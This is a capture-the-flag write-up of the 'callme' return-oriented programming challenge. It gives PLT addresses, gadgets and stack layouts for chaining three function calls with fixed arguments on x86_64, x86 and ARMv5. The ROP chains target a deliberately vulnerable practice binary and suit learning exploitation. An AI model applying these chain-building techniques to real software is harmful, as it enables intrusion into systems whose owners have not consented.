# callme

Starting from now, i wont detail calling conventions nor show the buffer in visuals.   
The previous stack layout will be omitted too, for the same reasons.   
I consider that the vulnerability is understood if this challenge is reached.   

For this one, the objective is to call 3 functions in a certain order with some fixed args:   
`callme_one`, `callme_two` and `callme_three`   
using `0xdeadbeef`, `0xcafebabe` and `0xd00df00d` as 1st, 2nd and 3rd arguments.
(extended to 64 bits for x86_64)

## x86_64:
```asm
0000000000400720 <callme_one@plt>:

0000000000400740 <callme_two@plt>:

00000000004006f0 <callme_three@plt>:

000000000040093c <usefulGadgets>:
  40093c:	5f               pop    rdi
  40093d:	5e               pop    rsi
  40093e:	5a               pop    rdx
  40093f:	c3               ret    
```
With the 3 PLT entries and the provided gadget to pop the 3 first arguments,
the final exploit is pretty straightforward. We'll build 3 function calls chaining the gadget address,
the arguments, then the PLT address for each of the 3 functions.   
Like in the first challenge, we would be striked by an alignment error for jumping into the PLT directly,
so a `ret` address will be used to re-align the stack to 16 bytes.

```
┌─────────────────────────┐
│ 0x40093f                │ <- ret
├─────────────────────────┤
│ 0x40093c                │ <- pop rdi; pop rsi; pop rdx; ret
├─────────────────────────┤
│ 0xdeadbeefdeadbeef      │ <- rdi
├─────────────────────────┤
│ 0xcafebabecafebabe      │ <- rsi
├─────────────────────────┤
│ 0xd00df00dd00df00d      │ <- rdx
├─────────────────────────┤
│ 0x400720                │ <- callme_one
├─────────────────────────┤
│ ...                     │ <- pop rdi; pop rsi; pop rdx; ret (for callme_two)
```
The 5 words pattern from the gadget to the call is then repeated 2 times, with callme_two and callme_three instead.

## x86:
```asm
080484f0 <callme_one@plt>:

08048550 <callme_two@plt>:

080484e0 <callme_three@plt>:

080487a0 <__libc_csu_init + 0x59>:
 80487f9:	5e               pop    esi
 80487fa:	5f               pop    edi
 80487fb:	5d               pop    ebp
 80487fc:	c3               ret    
```
For this one, we have to switch to the x86 calling convention, but the execution stays the same.   
I took a 3-long `pop` chain as a gadget to cleanup the stack after my calls, so i ordered them like this:   
For each one of the 3 functions, i have its address followed by the gadget then the 3 arguments.
```
┌─────────────┐
│ 0x080484f0  │ <- callme_one
├─────────────┤
│ 0x080487a0  │ <- pop esi; pop edi; pop ebp; ret
├─────────────┤
│ 0xdeadbeef  │
├─────────────┤
│ 0xcafebabe  │
├─────────────┤
│ 0xd00df00d  │
├─────────────┤
│ ...         │ <- callme_two
```
As for x86_64, we just have to repeat 3 times this 5 words pattern.
## ARMv5:
```asm
00010618 <callme_one@plt>:

0001066c <callme_two@plt>:

0001060c <callme_three@plt>:

00010870 <usefulGadgets>:
   10870:	e8bdc007 	pop	{r0, r1, r2, lr, pc}
```
With the help of the provided gadget, we are able to load 3 arguments into `r0` to `r2`,
and redirect the execution with lr and pc.   
First, we pop the arguments for our first call, setting `lr` to come back and pop after callme_one,
and `pc` to the correct PLT entry. Then its just repetition, callme_one will jump into the pop for
callme_two args, and so on...
```
┌─────────────┐
│ 0x00010870  │ <- pop {r0, r1, r2, lr, pc}
├─────────────┤
│ 0xdeadbeef  │
├─────────────┤
│ 0xcafebabe  │
├─────────────┤
│ 0xd00df00d  │
├─────────────┤
│ 0x00010870  │ <- pop {r0, r1, r2, lr, pc}
├─────────────┤
│ 0x00010618  │ <- callme_one
├─────────────┤
│ ...         │
```
As in the x86 and x86_64, there is a 5 words pattern that can be repeated, after the first pop.
